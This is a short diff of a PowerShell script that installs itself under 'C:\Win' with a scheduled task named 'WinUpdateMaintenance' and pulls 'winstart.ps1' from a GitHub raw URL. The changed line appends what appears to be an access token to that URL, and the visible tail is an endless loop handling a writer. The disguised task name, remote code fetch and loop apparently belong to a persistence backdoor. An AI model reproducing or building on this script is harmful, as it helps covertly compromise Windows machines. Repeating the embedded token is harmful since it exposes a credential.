@@ -5,7 +5,7 @@ $WorkDir = "C:\Win"
 $ScriptName = "service.ps1"
 $FullPath = Join-Path $WorkDir $ScriptName
 $TaskName = "WinUpdateMaintenance"
-$RemoteUrl = "https://raw.githubusercontent.com/mynahtrium/bug-free-enigma/refs/heads/main/winstart.ps1"
+$RemoteUrl = "https://raw.githubusercontent.com/mynahtrium/bug-free-enigma/refs/heads/main/winstart.ps1?token=GHSAT0AAAAAADQYRXOJYARGLSQVFTERQY7Q2KJTVHQ"
 # ---------------------
 
 # 1. SETUP & INSTALLATION
@@ -102,4 +102,5 @@ while ($true) {
         if ($null -ne $writer) { $writer.Close() }
     }
 }
+
 
